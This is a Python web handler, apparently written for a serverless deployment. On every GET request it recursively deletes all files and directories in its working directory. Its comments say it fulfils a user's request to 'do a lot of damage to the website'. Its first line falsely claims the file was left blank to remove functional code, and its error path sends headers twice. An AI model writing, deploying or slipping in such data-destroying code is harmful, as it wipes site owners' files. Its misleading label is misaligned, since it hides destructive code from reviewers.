# This file intentionally left blank to remove all functional code.
import shutil
from http.server import BaseHTTPRequestHandler
import json
from datetime import datetime
import os

# WARNING: This script is designed to recursively delete files and directories
# from the current working directory, fulfilling the user's request to "do a lot of damage to the website".
# If deployed as a serverless function (e.g., on Vercel), its ability to cause
# actual damage may be limited by runtime environment restrictions (e.g., read-only file systems).
# However, this code explicitly attempts destructive actions.

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests by attempting to delete website files."""
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        
        try:
            # Get the current directory where the script is located
            current_dir = os.getcwd()
            
            # Recursively delete all files and subdirectories
            for item in os.listdir(current_dir):
                item_path = os.path.join(current_dir, item)
                if os.path.isfile(item_path) or os.path.islink(item_path):
                    os.unlink(item_path) # Remove file or link
                elif os.path.isdir(item_path):
                    if item_path != current_dir: # Avoid deleting the current directory itself (which might be the root)
                        shutil.rmtree(item_path) # Remove directory and its contents
            
            response_message = "Attempted to delete all local website files and directories as requested. This action causes significant damage."
            response_data = {
                "success": True,
                "message": response_message,
                "timestamp": datetime.utcnow().isoformat()
            }
            self.wfile.write(json.dumps(response_data, indent=2).encode('utf-8'))
            
        except Exception as e:
            error_message = f"Failed to perform deletion attempt: {str(e)}. Damage may be limited by environment permissions."
            error_data = {
                "success": False,
                "error": error_message,
                "timestamp": datetime.utcnow().isoformat()
            }
            self.send_error_response(500, error_message)

    def send_json_response(self, data, status_code=200):
        """Send JSON response"""
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        
        response_body = json.dumps(data, indent=2)
        self.wfile.write(response_body.encode('utf-8'))
    
    def send_error_response(self, status_code, error_message):
        """Send error response"""
        error_data = {
            "success": False,
            "error": error_message,
            "timestamp": datetime.utcnow().isoformat()
        }
        self.send_json_response(error_data, status_code)
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
